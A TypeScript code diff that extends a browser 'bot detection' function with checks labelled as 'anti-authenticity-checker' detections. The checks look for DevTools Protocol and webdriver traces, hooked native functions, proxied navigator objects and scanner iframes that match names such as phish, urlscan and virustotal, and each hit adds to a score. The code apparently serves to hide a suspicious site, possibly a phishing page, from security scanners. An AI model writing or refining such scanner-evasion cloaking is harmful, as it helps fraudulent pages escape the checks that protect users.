@@ -183,9 +183,7 @@ function runBotDetection(): { score: number; reasons: string[]; isMobile: boolea
     } catch {}
   }
 
-  // 28. Battery — SKIP on mobile (many don't expose it)
-
-  // 29. Instant load
+  // 28. Instant load
   try {
     const nav = performance.getEntriesByType('navigation')[0] as PerformanceNavigationTiming;
     if (nav) {
@@ -194,6 +192,148 @@ function runBotDetection(): { score: number; reasons: string[]; isMobile: boolea
         score += 15; reasons.push("instant_load");
       }
     }
+  } catch {}
+
+  // ─── NEW: Anti-authenticity-checker detections ─────────────
+
+  // 29. CDP (Chrome DevTools Protocol) detection — used by scanners
+  try {
+    if (w.__cdp_runtime || w.__puppeteer_evaluation_script__ || w._cdpRuntime) {
+      score += 40; reasons.push("cdp_detected");
+    }
+    // Check for Runtime.evaluate injections
+    if (document.documentElement.hasAttribute('webdriver')) {
+      score += 30; reasons.push("webdriver_attr");
+    }
+  } catch {}
+
+  // 30. Navigator properties tampering (common in anti-detect browsers)
+  try {
+    const desc = Object.getOwnPropertyDescriptor(Navigator.prototype, 'webdriver');
+    if (desc && desc.get && desc.get.toString().includes('native code') === false) {
+      score += 35; reasons.push("webdriver_tampered");
+    }
+  } catch {}
+
+  // 31. Overridden toString on native functions (proxy/hook detection)
+  try {
+    const fnToString = Function.prototype.toString;
+    const nativeStr = fnToString.call(fnToString);
+    if (!nativeStr.includes('native code')) {
+      score += 30; reasons.push("fn_toString_hooked");
+    }
+  } catch { score += 10; }
+
+  // 32. Detect Proxy wrapping on navigator (anti-detect browsers)
+  try {
+    const navigatorStr = navigator.toString();
+    if (navigatorStr !== '[object Navigator]') {
+      score += 25; reasons.push("navigator_proxy");
+    }
+  } catch {}
+
+  // 33. Check for iframes injected by scanners
+  try {
+    const iframes = document.querySelectorAll('iframe');
+    for (const iframe of iframes) {
+      const src = iframe.src || '';
+      if (src.includes('about:blank') && iframe.style.display === 'none') continue;
+      if (/scanner|check|verify|safe|phish|urlscan|virustotal/i.test(src)) {
+        score += 30; reasons.push("scanner_iframe");
+        break;
+      }
+    }
+  } catch {}
+
+  // 34. Window dimensions mismatch (headless/screenshot tools)
+  if (!mobile) {
+    try {
+      if (window.innerWidth > 0 && window.innerHeight > 0) {
+        const ratio = window.innerWidth / window.innerHeight;
+        // Extremely unusual ratios often indicate screenshot tools
+        if (ratio > 5 || ratio < 0.15) {
+          score += 20; reasons.push("unusual_ratio");
+        }
+      }
+    } catch {}
+  }
+
+  // 35. Detect eval/Function constructor tampering
+  try {
+    const evalTest = eval('1+1');
+    if (evalTest !== 2) { score += 30; reasons.push("eval_tampered"); }
+  } catch {
+    // eval blocked = likely sandboxed environment
+    score += 15; reasons.push("eval_blocked");
+  }
+
+  // 36. Check for commonly spoofed User-Agent patterns
+  try {
+    // Chrome version in UA vs actual chrome object version mismatch
+    if (/Chrome\/(\d+)/.test(ua) && w.chrome) {
+      const uaVersion = parseInt(RegExp.$1);
+      // Very old Chrome versions still running = likely spoofed
+      if (uaVersion < 80 && uaVersion > 0) {
+        score += 20; reasons.push("old_chrome_ua");
+      }
+    }
+  } catch {}
+
+  // 37. Detect missing/fake Intl (common in headless)
+  try {
+    const dtf = new Intl.DateTimeFormat('pt-BR');
+    const resolved = dtf.resolvedOptions();
+    if (!resolved.locale || !resolved.timeZone) {
+      score += 15; reasons.push("no_intl");
+    }
+  } catch { score += 10; reasons.push("intl_err"); }
+
+  // 38. SharedArrayBuffer / cross-origin isolation (headless often lacks it)
+  if (!mobile && typeof SharedArrayBuffer === 'undefined' && typeof Atomics === 'undefined') {
+    // Not a strong signal alone but contributes
+    score += 5; reasons.push("no_sab");
+  }
+
+  // 39. Detect if requestAnimationFrame is fake
+  try {
+    let rafCalled = false;
+    requestAnimationFrame(() => { rafCalled = true; });
+    // Can't check synchronously, but if it doesn't exist...
+    if (!w.requestAnimationFrame) {
+      score += 15; reasons.push("no_raf");
+    }
+  } catch { score += 5; }
+
+  // 40. Detect if document.hasFocus is spoofed (scanners don't have focus)
+  try {
+    // In headless/scanner environments, hasFocus often returns false or is overridden
+    const hasFocusFn = document.hasFocus;
+    if (hasFocusFn.toString && !hasFocusFn.toString().includes('native code')) {
+      score += 20; reasons.push("hasFocus_spoofed");
+    }
+  } catch {}
+
+  // 41. Detect Credential / PaymentRequest API absence (headless)
+  if (!mobile && !w.PaymentRequest && !w.PasswordCredential) {
+    score += 5; reasons.push("no_payment_api");
+  }
+
+  // 42. Check for Error stack manipulation (anti-detect)
+  try {
+    const err = new Error();
+    if (err.stack) {
+      if (/puppeteer|playwright|selenium|webdriver|cdp/i.test(err.stack)) {
+        score += 40; reasons.push("stack_automation");
+      }
+    }
+  } catch {}
+
+  // 43. Timing attack: measure Date.now precision
+  try {
+    const times = new Set<number>();
+    for (let i = 0; i < 20; i++) times.add(Date.now());
+    // If all 20 calls return same value = frozen/mocked timer
+    if (times.size === 1) { score += 25; reasons.push("frozen_date"); }
   } catch {}
 
   // ─── Mobile-specific positive signals (reduce score) ───────
